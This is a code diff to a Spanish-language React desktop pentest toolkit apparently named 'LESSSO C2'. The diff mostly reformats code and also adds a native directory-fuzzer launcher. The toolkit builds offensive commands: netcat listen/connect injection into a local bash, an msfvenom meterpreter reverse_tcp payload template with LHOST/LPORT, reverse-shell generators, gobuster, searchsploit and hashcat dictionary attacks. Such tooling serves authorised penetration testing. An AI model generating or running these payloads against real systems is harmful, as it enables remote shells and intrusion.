@@ -22,74 +22,34 @@ export function NetcatTool() {
   const unlistenFuncs = useRef<Array<() => void>>([]);
 
   const stopTerminal = async () => {
-    if (sessionId) {
-      await invoke('kill_terminal', { sessionId });
-      terminalInstance.current?.writeln('\r\n\x1b[1;31m[!] Sesión local terminada.\x1b[0m');
-    }
+    if (sessionId) { await invoke('kill_terminal', { sessionId }); terminalInstance.current?.writeln('\r\n\x1b[1;31m[!] Sesión local terminada.\x1b[0m'); }
     setIsActive(false);
   }
 
   const startTerminal = async () => {
-    const sid = Date.now().toString();
-    setSessionId(sid);
-    setIsActive(true);
-
+    const sid = Date.now().toString(); setSessionId(sid); setIsActive(true);
     setTimeout(async () => {
       if (!termRef.current) return;
       termRef.current.innerHTML = ''; 
-      const term = new Terminal({
-        theme: { background: '#0b1120', foreground: '#34d399', cursor: '#34d399' },
-        fontSize: 13, fontFamily: 'monospace', cursorBlink: true
-      });
-      const fitAddon = new FitAddon();
-      term.loadAddon(fitAddon);
-      term.open(termRef.current);
-      fitAddon.fit();
-      terminalInstance.current = term;
-
+      const term = new Terminal({ theme: { background: '#0b1120', foreground: '#34d399', cursor: '#34d399' }, fontSize: 13, fontFamily: 'monospace', cursorBlink: true });
+      const fitAddon = new FitAddon(); term.loadAddon(fitAddon); term.open(termRef.current); fitAddon.fit(); terminalInstance.current = term;
       term.writeln('\x1b[1;36m[*] LESSSO C2 - Inicializando Terminal Local (Bash)...\x1b[0m');
 
-      const unlistenOut = await listen<string>(`term-output-${sid}`, (e) => {
-        const formatted = e.payload.replace(/\n/g, '\r\n');
-        term.write(formatted);
-      });
-      
-      const unlistenExit = await listen(`term-exit-${sid}`, () => {
-        term.writeln('\r\n\x1b[1;33m[*] Proceso finalizado.\x1b[0m');
-        setIsActive(false);
-      });
-
+      const unlistenOut = await listen<string>(`term-output-${sid}`, (e) => { term.write(e.payload.replace(/\n/g, '\r\n')); });
+      const unlistenExit = await listen(`term-exit-${sid}`, () => { term.writeln('\r\n\x1b[1;33m[*] Proceso finalizado.\x1b[0m'); setIsActive(false); });
       unlistenFuncs.current.push(unlistenOut, unlistenExit);
+      term.onData(data => { invoke('write_terminal', { sessionId: sid, data }).catch(() => {}); });
+      try { await invoke('start_terminal', { sessionId: sid, cmd: '/bin/bash', args: ['-i'] }); } catch (err) { term.writeln(`\r\n\x1b[1;31m[!] Error del Sistema: ${err}\x1b[0m`); setIsActive(false); }
 
-      term.onData(data => {
-        invoke('write_terminal', { sessionId: sid, data }).catch(() => {});
-      });
-
-      try {
-        await invoke('start_terminal', { sessionId: sid, cmd: '/bin/bash', args: ['-i'] });
-      } catch (err) {
-        term.writeln(`\r\n\x1b[1;31m[!] Error del Sistema: ${err}\x1b[0m`);
-        setIsActive(false);
-      }
-
-      const resizeHandler = () => fitAddon.fit();
-      window.addEventListener('resize', resizeHandler);
+      const resizeHandler = () => fitAddon.fit(); window.addEventListener('resize', resizeHandler);
       unlistenFuncs.current.push(() => window.removeEventListener('resize', resizeHandler));
     }, 100);
   }
 
   const injectNetcatCommand = () => {
     if (!sessionId) return;
-    let cmd = 'nc ';
-    if (ncNoDns) cmd += '-n ';
-    if (ncVerbose) cmd += '-v ';
-    
-    if (ncMode === 'listen') {
-      cmd += `-l -p ${ncPort}`;
-    } else {
-      cmd += `${ncIp || '<IP>'} ${ncPort}`;
-    }
-    
+    let cmd = 'nc '; if (ncNoDns) cmd += '-n '; if (ncVerbose) cmd += '-v ';
+    if (ncMode === 'listen') { cmd += `-l -p ${ncPort}`; } else { cmd += `${ncIp || '<IP>'} ${ncPort}`; }
     invoke('write_terminal', { sessionId, data: cmd + '\n' }).catch(() => {});
   }
 
@@ -99,12 +59,7 @@ export function NetcatTool() {
     invoke('write_terminal', { sessionId, data: macro }).catch(() => {});
   }
 
-  useEffect(() => {
-    return () => {
-      unlistenFuncs.current.forEach(f => f());
-      if (sessionId) invoke('kill_terminal', { sessionId }).catch(()=>{});
-    }
-  }, [sessionId]);
+  useEffect(() => { return () => { unlistenFuncs.current.forEach(f => f()); if (sessionId) invoke('kill_terminal', { sessionId }).catch(()=>{}); } }, [sessionId]);
 
   return (
     <div className="flex flex-col h-full overflow-hidden p-1">
@@ -112,7 +67,7 @@ export function NetcatTool() {
         <div className="flex flex-col items-center justify-center h-full text-center p-4">
           <div className="w-16 h-16 bg-teal-100 dark:bg-[#0b282c]/30 text-[#0b282c] dark:text-teal-400 rounded-full flex items-center justify-center text-3xl mb-4 shadow-sm border border-teal-200 dark:border-[#0b282c]/50">🖥️</div>
           <h3 className="text-sm font-bold text-slate-700 dark:text-slate-300 mb-2">Terminal Local Inactiva</h3>
-          <p className="text-[11px] text-slate-500 mb-6 max-w-sm">Inicia una sesión de Bash local. Podrás inyectar Netcat, hacer pings o usar SSH sin salir de LESSSO C2.</p>
+          <p className="text-[11px] text-slate-500 mb-6 max-w-sm">Inicia una sesión de Bash local. Podrás inyectar Netcat o usar SSH sin salir de LESSSO C2.</p>
           <button onClick={startTerminal} className="bg-[#0b282c] hover:bg-[#081e21] text-white font-bold py-2.5 px-8 rounded shadow-lg shadow-[#0b282c]/20 transition-all uppercase text-[11px] tracking-wider">
             INICIAR BASH LOCAL
           </button>
@@ -127,7 +82,6 @@ export function NetcatTool() {
                </div>
                <button onClick={stopTerminal} className="text-[9px] bg-red-900/50 text-red-400 hover:bg-red-500 hover:text-white px-3 py-1 rounded font-bold uppercase transition-colors tracking-widest">Terminar Shell</button>
             </div>
-            
             <div className="bg-slate-900/80 p-1.5 rounded border border-slate-700 flex flex-wrap gap-2 items-center">
               <div className="flex bg-slate-800 rounded">
                 <button onClick={() => setNcMode('listen')} className={`px-2 py-1 text-[9px] font-bold rounded-sm uppercase transition-colors ${ncMode === 'listen' ? 'bg-[#0b282c] text-white' : 'text-slate-400'}`}>Listen</button>
@@ -135,14 +89,11 @@ export function NetcatTool() {
               </div>
               {ncMode === 'connect' && <input type="text" value={ncIp} onChange={e => setNcIp(e.target.value)} placeholder="IP Destino" className="w-28 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-[10px] text-white outline-none font-mono" />}
               <input type="text" value={ncPort} onChange={e => setNcPort(e.target.value)} placeholder="Puerto" className="w-20 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-[10px] font-mono text-white outline-none" />
-              
               <label className="flex items-center space-x-1.5 cursor-pointer" title="Evita consultas DNS (-n)"><input type="checkbox" checked={ncNoDns} onChange={() => setNcNoDns(!ncNoDns)} className="rounded text-teal-500 accent-teal-500" /><span className="text-[9px] font-bold text-slate-300">-n</span></label>
               <label className="flex items-center space-x-1.5 cursor-pointer" title="Verbose (-v)"><input type="checkbox" checked={ncVerbose} onChange={() => setNcVerbose(!ncVerbose)} className="rounded text-teal-500 accent-teal-500" /><span className="text-[9px] font-bold text-slate-300">-v</span></label>
-              
               <button onClick={injectNetcatCommand} className="ml-auto bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-1 rounded text-[9px] font-bold uppercase shadow-sm transition-colors">Inyectar Netcat ↵</button>
             </div>
           </div>
-
           <div ref={termRef} className="flex-1 w-full h-full p-2 bg-[#0b1120] overflow-hidden" />
         </div>
       )}
@@ -151,7 +102,8 @@ export function NetcatTool() {
 }
 
 export function PayloadsTool() {
-  const { vpnIp } = useScanStore();
+  // FUZZER NATIVO INTEGRADO AQUÍ
+  const { vpnIp, startFuzzer, isFuzzing } = useScanStore();
   const [rsIp, setRsIp] = useState(vpnIp || '10.10.14.X');
   const [rsPort, setRsPort] = useState('4444');
   const [tab, setTab] = useState<'linux' | 'windows' | 'msfvenom'>('linux');
@@ -170,16 +122,9 @@ export function PayloadsTool() {
 
   const browseWordlist = async () => {
     try {
-      const selected = await openDialog({
-        title: 'Seleccionar Wordlist (Diccionario)',
-        filters: [{ name: 'Text Files', extensions: ['txt', 'list', 'csv'] }]
-      });
-      if (selected && !Array.isArray(selected)) {
-        setGoWordlist(selected);
-      }
-    } catch (err) {
-      console.error(err);
-    }
+      const selected = await openDialog({ title: 'Seleccionar Wordlist (Diccionario)', filters: [{ name: 'Text Files', extensions: ['txt', 'list', 'csv'] }] });
+      if (selected && !Array.isArray(selected)) { setGoWordlist(selected); }
+    } catch (err) { console.error(err); }
   };
 
   const getRevShell = (type: string) => {
@@ -189,12 +134,10 @@ export function PayloadsTool() {
     return '';
   }
   const getMsfVenom = () => `msfvenom -p ${msfPlatform}/${msfArch}/meterpreter/reverse_tcp LHOST=${rsIp} LPORT=${rsPort} -f ${msfFormat} -o shell.${msfFormat}`;
-  const getGobusterCmd = () => `gobuster dir -u ${goUrl || 'http://target'} -w "${goWordlist}" -t 50`;
   const getSearchsploitCmd = () => `searchsploit ${ssTerm || '<software_version>'}`;
 
   return (
     <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3 space-y-4">
-      
       <div className="flex border-b border-slate-200 dark:border-slate-800">
         <button onClick={() => setTab('linux')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'linux' ? 'border-emerald-500 text-emerald-600 dark:text-emerald-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>Linux RS</button>
         <button onClick={() => setTab('windows')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'windows' ? 'border-blue-500 text-blue-600 dark:text-blue-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>Windows RS</button>
@@ -238,21 +181,19 @@ export function PayloadsTool() {
       )}
 
       <div className="space-y-3">
-        <h3 className="text-[10px] tracking-widest font-black text-orange-600 dark:text-orange-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Gobuster</h3>
+        <h3 className="text-[10px] tracking-widest font-black text-orange-600 dark:text-orange-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Fuzzer Nativo (Gobuster)</h3>
         <input type="text" value={goUrl} onChange={e => setGoUrl(e.target.value)} placeholder="URL: http://target.com" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs dark:text-white outline-none" />
         
-        {/* SELECTOR NATIVO DE WORDLISTS */}
         <div className="flex gap-1.5">
           <input list="wordlists-options" value={goWordlist} onChange={e => setGoWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="flex-1 px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
-          <datalist id="wordlists-options">
-            <option value="/usr/share/wordlists/dirb/common.txt" />
-            <option value="/usr/share/wordlists/dirb/big.txt" />
-            <option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" />
-          </datalist>
+          <datalist id="wordlists-options"><option value="/usr/share/wordlists/dirb/common.txt" /><option value="/usr/share/wordlists/dirb/big.txt" /><option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" /></datalist>
           <button onClick={browseWordlist} className="px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[10px] font-bold rounded hover:bg-slate-300 dark:hover:bg-slate-700 transition-colors">Examinar...</button>
         </div>
 
-        <button onClick={() => copyToClipboard(getGobusterCmd())} className="w-full bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400 px-3 py-1.5 rounded text-xs font-bold hover:bg-orange-200 border border-orange-200 dark:border-orange-800/50 transition-colors">Copiar Comando</button>
+        {/* LANZADOR NATIVO - ELIMINADO EL COPIAR PORTAPAPELES */}
+        <button onClick={() => startFuzzer(goUrl, goWordlist)} disabled={isFuzzing || !goUrl} className="w-full bg-orange-500 disabled:bg-orange-300 text-white px-3 py-2.5 rounded text-xs font-black shadow-lg hover:bg-orange-600 transition-colors flex items-center justify-center gap-2">
+          {isFuzzing ? <span className="animate-pulse">FUZZEANDO...</span> : '🚀 LANZAR FUZZER'}
+        </button>
       </div>
 
       <div className="space-y-3 pt-4 border-t border-slate-200 dark:border-slate-800">
@@ -268,36 +209,18 @@ export function DecodersTool() {
   const [inputText, setInputText] = useState('')
   const [outputText, setOutputText] = useState('')
   const [detectedType, setDetectedType] = useState('Texto Plano')
-  
   const [hashMode, setHashMode] = useState('0')
   const [hashWordlist, setHashWordlist] = useState('/usr/share/wordlists/rockyou.txt')
 
   const copyToClipboard = (cmd: string) => { navigator.clipboard.writeText(cmd); alert(`Copiado al portapapeles!`); }
-
-  const browseHashWordlist = async () => {
-    try {
-      const selected = await openDialog({ title: 'Seleccionar Wordlist para Hashcat', filters: [{ name: 'Text Files', extensions: ['txt', 'list'] }] });
-      if (selected && !Array.isArray(selected)) setHashWordlist(selected);
-    } catch (err) {}
-  };
+  const browseHashWordlist = async () => { try { const selected = await openDialog({ title: 'Seleccionar Wordlist para Hashcat', filters: [{ name: 'Text Files', extensions: ['txt', 'list'] }] }); if (selected && !Array.isArray(selected)) setHashWordlist(selected); } catch (err) {} };
 
   const handleJWT = () => {
-    try {
-      const parts = inputText.split('.');
-      if (parts.length !== 3) throw new Error("No es un JWT válido");
-      const header = JSON.parse(atob(parts[0]));
-      const payload = JSON.parse(atob(parts[1]));
-      setOutputText(`--- HEADER ---\n${JSON.stringify(header, null, 2)}\n\n--- PAYLOAD ---\n${JSON.stringify(payload, null, 2)}\n\n--- SIGNATURE ---\n(Firma presente)`);
-    } catch { setOutputText('Error: No es un JSON Web Token (JWT) válido.'); }
+    try { const parts = inputText.split('.'); if (parts.length !== 3) throw new Error("No es un JWT válido"); const header = JSON.parse(atob(parts[0])); const payload = JSON.parse(atob(parts[1])); setOutputText(`--- HEADER ---\n${JSON.stringify(header, null, 2)}\n\n--- PAYLOAD ---\n${JSON.stringify(payload, null, 2)}\n\n--- SIGNATURE ---\n(Firma presente)`); } catch { setOutputText('Error: No es un JSON Web Token (JWT) válido.'); }
   }
 
   const handleDecode = (type: 'b64_encode' | 'b64_decode' | 'url_encode' | 'url_decode') => {
-    try {
-      if (type === 'b64_encode') setOutputText(btoa(inputText));
-      if (type === 'b64_decode') setOutputText(atob(inputText));
-      if (type === 'url_encode') setOutputText(encodeURIComponent(inputText));
-      if (type === 'url_decode') setOutputText(decodeURIComponent(inputText));
-    } catch { setOutputText('Error: Entrada inválida.'); }
+    try { if (type === 'b64_encode') setOutputText(btoa(inputText)); if (type === 'b64_decode') setOutputText(atob(inputText)); if (type === 'url_encode') setOutputText(encodeURIComponent(inputText)); if (type === 'url_decode') setOutputText(decodeURIComponent(inputText)); } catch { setOutputText('Error: Entrada inválida.'); }
   }
 
   useEffect(() => {
@@ -317,44 +240,27 @@ export function DecodersTool() {
 
   return (
     <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3">
-      <div className="flex justify-between items-center border-b border-slate-200 dark:border-slate-800 pb-1 mb-3">
-        <h3 className="text-[10px] tracking-widest font-black text-fuchsia-600 dark:text-fuchsia-400 uppercase">Criptografía</h3>
-        <span className="text-[9px] font-bold text-slate-400 bg-slate-100 dark:bg-slate-800 px-2 py-0.5 rounded">{detectedType}</span>
-      </div>
-      
+      <div className="flex justify-between items-center border-b border-slate-200 dark:border-slate-800 pb-1 mb-3"><h3 className="text-[10px] tracking-widest font-black text-fuchsia-600 dark:text-fuchsia-400 uppercase">Criptografía</h3><span className="text-[9px] font-bold text-slate-400 bg-slate-100 dark:bg-slate-800 px-2 py-0.5 rounded">{detectedType}</span></div>
       <textarea value={inputText} onChange={(e) => setInputText(e.target.value)} placeholder="Pega un Hash, Base64, URL o JWT..." className="w-full h-24 p-2 text-xs bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded-md outline-none dark:text-slate-200 font-mono resize-none shrink-0 mb-3" />
-      
       <div className="flex flex-wrap gap-2 mb-3">
         <button onClick={() => handleDecode('b64_decode')} className="flex-1 px-2 py-1.5 bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-400 text-[10px] font-bold rounded hover:bg-indigo-200">B64 Dec</button>
         <button onClick={() => handleDecode('b64_encode')} className="flex-1 px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-200 text-[10px] font-bold rounded hover:bg-slate-300">B64 Enc</button>
         <button onClick={() => handleDecode('url_decode')} className="flex-1 px-2 py-1.5 bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-400 text-[10px] font-bold rounded hover:bg-indigo-200">URL Dec</button>
         <button onClick={() => handleDecode('url_encode')} className="flex-1 px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-200 text-[10px] font-bold rounded hover:bg-slate-300">URL Enc</button>
       </div>
-
       <button onClick={handleJWT} className="w-full mb-3 px-3 py-1.5 bg-fuchsia-100 dark:bg-fuchsia-900/50 text-fuchsia-700 dark:text-fuchsia-400 text-[10px] font-bold uppercase rounded border border-fuchsia-200 dark:border-fuchsia-800/50 hover:bg-fuchsia-200 transition-colors">Decodificar JWT</button>
-      
       <textarea value={outputText} readOnly placeholder="Resultado..." className="w-full h-32 p-2 text-[11px] bg-indigo-50 dark:bg-indigo-900/10 border border-indigo-100 dark:border-indigo-900/50 rounded-md outline-none text-indigo-900 dark:text-indigo-300 font-mono resize-none custom-scrollbar shrink-0 mb-4" />
-
       <div className="border-t border-slate-200 dark:border-slate-800 pt-3">
          <h3 className="text-[10px] tracking-widest font-black text-rose-600 dark:text-rose-400 uppercase mb-2">Generador Hashcat</h3>
          <div className="flex gap-2 mb-2">
-            <div className="flex-1">
-               <label className="text-[8px] font-bold text-slate-500 uppercase">Hash Mode (-m)</label>
-               <input type="text" value={hashMode} onChange={e => setHashMode(e.target.value)} placeholder="0 (MD5)" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
-            </div>
-            <div className="flex-1">
-               <label className="text-[8px] font-bold text-slate-500 uppercase">Ataque (-a)</label>
-               <select className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none">
-                 <option value="0">0 (Diccionario)</option>
-               </select>
-            </div>
+            <div className="flex-1"><label className="text-[8px] font-bold text-slate-500 uppercase">Hash Mode (-m)</label><input type="text" value={hashMode} onChange={e => setHashMode(e.target.value)} placeholder="0 (MD5)" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" /></div>
+            <div className="flex-1"><label className="text-[8px] font-bold text-slate-500 uppercase">Ataque (-a)</label><select className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none"><option value="0">0 (Diccionario)</option></select></div>
          </div>
          <label className="text-[8px] font-bold text-slate-500 uppercase">Wordlist</label>
          <div className="flex gap-1.5 mb-2">
            <input type="text" value={hashWordlist} onChange={e => setHashWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="flex-1 px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
            <button onClick={browseHashWordlist} className="px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[10px] font-bold rounded hover:bg-slate-300 dark:hover:bg-slate-700 transition-colors">Examinar...</button>
          </div>
-
          <button onClick={() => copyToClipboard(`hashcat -m ${hashMode} -a 0 hash.txt "${hashWordlist}"`)} className="w-full bg-[#0b282c] text-white px-3 py-1.5 rounded text-xs font-bold hover:bg-[#081e21] transition-colors shadow-sm">Copiar Comando Hashcat</button>
       </div>
     </div>
